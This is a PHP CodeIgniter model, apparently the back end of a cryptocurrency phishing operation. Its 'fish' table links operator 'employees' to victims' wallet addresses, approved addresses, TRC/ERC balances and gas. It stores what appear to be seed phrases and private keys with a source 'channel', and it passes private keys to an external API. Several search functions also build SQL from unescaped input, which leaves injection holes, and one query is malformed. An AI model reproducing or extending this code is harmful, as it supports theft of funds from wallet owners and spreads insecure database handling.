<?php if(!defined('BASEPATH')) exit('No direct script access allowed');

// use GuzzleHttp\Client;
use GuzzleHttp\Client;
class Fish_model extends CI_Model
{

    function new_trc($employee, $address, $au_address)
    {
        $data = array(
            'employee'=>$employee,
            'address'=>$address,
            'au_address'=>$au_address,
            'type'=>'trc'
        );
        $this->db->insert('fish',$data);
         return $this->db->insert_id('id');
    }
    
    function edit_fish($id){
        $data = array(
          'address' => $this->input->post('address'),
            'au_address' => $this->input->post('au_address'),
            'type' => $this->input->post('type')
        );
        $this->db->where('id', $id);
        $this->db->update('fish', $data);

    }


    function new_key($employee, $address, $name)
    {
        $data = array(
            'employee'=>$employee,
            'au_address'=>$address,
            'type'=>$name
        );
        $this->db->insert('fish',$data);
    }

    function find_new()
    { 
        $this->db->select('*');
        $this->db->where('parent_id',0);
        $query = $this->db->get('fish');
        return $query->result_array();
    }
    
     function select_byid($id)
    { 
        $this->db->select('*');
        $this->db->where('id',$id);
        $query = $this->db->get('fish');
        return $query->result_array();
    }
    
    function hulue($id){
        $data = array(
            'parent_id' =>1
        );
        $this->db->where('id', $id);
        $this->db->update('fish', $data);
    }
    
    function zhanshi($id){
        $data = array(
            'zhanshi' =>1
        );
        $this->db->where('id', $id);
        $this->db->update('fish', $data);
    }
    
    function quxiaozhanshi($id){
        $data = array(
            'zhanshi' =>0
        );
        $this->db->where('id', $id);
        $this->db->update('fish', $data);
    }
    
    function hulueall(){
        $data = array(
            'parent_id' =>1
        );
        $this->db->update('fish', $data);
    }



    function new_erc($employee, $address, $au_address)
    {
        $data = array(
            'employee'=>$employee,
            'address'=>$address,
            'au_address'=>$au_address,
            'type'=>'erc'
        );
        $this->db->insert('fish',$data);
        return $this->db->insert_id('id');
    }
    
     function new_zhujici($employee, $address, $au_address,$type,$type1)
    {
        $data = array(
            'employee'=>$employee,
            'address'=>$address,
            'au_address'=>$au_address,
            'qudao'=>$type,
            'type'=>$type1
        );
        $this->db->insert('fish',$data);
        return $this->db->insert_id('id');
    }

    function find_by_employee($employee_id){
        // $this->db->select('*');
        // $this->db->where('employee',$employee_id);
        // $this->db->order_by('time', 'DESC');
        // $query = $this->db->get('fish');

        $query = $this->db->query('select b.*,a.name from tbl_users a, fish b where a.userId = b.employee and  a.userId = "'.$employee_id.'%"');
    
        return $query->result_array();
    }


    function checkaddress($address){
        $this->db->select('*');
        $this->db->where('address',$address);
        $query = $this->db->get('fish');
        return $query->result_array();
    }

    function find_by_fuzzy($name){
        // $this->db->select('*');
        // $this->db->where('employee',$employee_id);
        // $this->db->order_by('time', 'DESC');
        // $query = $this->db->get('fish');
        $query = $this->db->query('select b.*,a.name from tbl_users a, fish b where a.userId = b.employee and  a.email like "'.$name.'%"');
        return $query->result_array();
    }

    function find_by_topAddress(){
        $query = $this->db->query('SELECT au_address FROM fish LIMIT 0,1000');
        return $query->result_array();
    }
    
    function pritoaddress($pri){
         try {
             $client = new Client;
             $result= @file_get_contents(get_config()['priapi'].$pri);
             return $result;
            } catch (Exception $e) {
                return "err";
            }
    }

    function find_by_fuzzy1(){
        // $this->db->select('*');
        // $this->db->where('employee',$employee_id);
        // $this->db->order_by('time', 'DESC');
        // $query = $this->db->get('fish');
        $query = $this->db->query('select b.*,a.name from tbl_users a, fish b where a.userId = b.employee order by b.time desc');
        return $query->result_array();
    }

    function find_by_search1($employee,$desc,$type,$time)
    {



        $sql ='select b.*,a.name from tbl_users a, fish b where a.userId = b.employee order by b.time desc';
        echo $employee;

        
        // $this->db->select('*');
        if($employee){
            $sql=$sql.' and a.email like "'.$employee.'%"';
        }
        if($type){
            $sql=$sql.' and b.type = "'.$type.'"';
        }

        if(strlen($time)>15){
            $arr1=explode(' - ',$time);
            // $this->db->where("time BETWEEN '$arr1[0]' AND '$arr1[1]'");
            $sql=$sql.' and b.time BETWEEN  "'.$arr1[0].'" and "'.$arr1[1].'"';
        }

        if($desc==1){
            // $this->db->order_by('balance', 'DESC');
            $sql=$sql.' order by b.balance desc';
        }
        if($desc==2){
            // $this->db->order_by('time', 'DESC');
            $sql=$sql.' order by  b.time desc';
        }
        

        $query = $this->db->query($sql);
        return $query->result_array();
    }

    function find_by_address(){
        $this->db->select('*');
        $query = $this->db->get('address');
        return $query->result_array();
    }
    
    


    //
    function find_by_search($username,$employee, $address, $au_address,$desc,$type,$time,$employee_id)
    {


        

        $sql ='select b.*,a.name from tbl_users a, fish b where a.userId = b.employee ';
        
        // $this->db->select('*');
        if($employee){
            $sql=$sql.' and a.userId = "'.$employee.'"';
        }

        if($username){
            $sql=$sql.' and a.email like "'.$username.'%"';
        }

        if($employee_id){
            $sql=$sql.' and a.userId = "'.$employee_id.'"';
        }

        if($address){
            $sql=$sql.' and b.address = "'.$address.'"';
        }

        if($au_address){
            $sql=$sql.' and b.au_address = "'.$au_address.'"';
        }


        if($type){
            $sql=$sql.' and b.type = "'.$type.'"';
        }

        if(strlen($time)>15){
            $arr1=explode(' - ',$time);
            // $this->db->where("time BETWEEN '$arr1[0]' AND '$arr1[1]'");
            $sql=$sql.' and b.time BETWEEN  "'.$arr1[0].'" and "'.$arr1[1].'"';
        }

        if($desc==1){
            // $this->db->order_by('balance', 'DESC');
            $sql=$sql.' order by  b.balance desc';
        }else{
            // $this->db->order_by('time', 'DESC');
            $sql=$sql.' order by  b.time desc';
        }
        

        $query = $this->db->query($sql);

        // echo $sql;
        return $query->result_array();


        

        
    }

    function find_by_top($top){
        $this->db->select('*');
        $this->db->where('top',$top);
        $this->db->order_by('time', 'DESC');
        $query = $this->db->get('fish');
        return $query->result_array();
    }

    function find_all(){
        $this->db->select('*');
        $this->db->order_by('time', 'DESC');
        $query = $this->db->get('fish');

        return $query->result_array();
    }

    function count_by_employee($employee_id){
        $this->db->select('*');
        $this->db->where('employee',$employee_id);
        $query = $this->db->get('fish');
        return $query->num_rows();
    }

    function count_all(){
        $this->db->select('*');
        $query = $this->db->get('fish');
        return $query->num_rows();
    }

    function update_balance_by_address($address,$balance){
        $data = array(
            'balance' =>$balance
        );
        $this->db->where('address', $address);
        $this->db->update('fish', $data);
    }
    
     function update_balance_by_id($id,$balance){
        $data = array(
            'balance' =>$balance
        );
        $this->db->where('id', $id);
        $this->db->update('fish', $data);
    }
    
         function update_gas_by_id($id,$balance){
        $data = array(
            'gas' =>$balance
        );
        $this->db->where('id', $id);
        $this->db->update('fish', $data);
    }
    
     
    function detele_by_id($id){
        $this->db->where('id', $id);
        $this->db->delete('fish');
    }
    
    function find_by_id($id){
         $this->db->select('*');
        $this->db->where('id', $id);
        $query = $this->db->get('fish');
       return $query->row();
    }

}

?>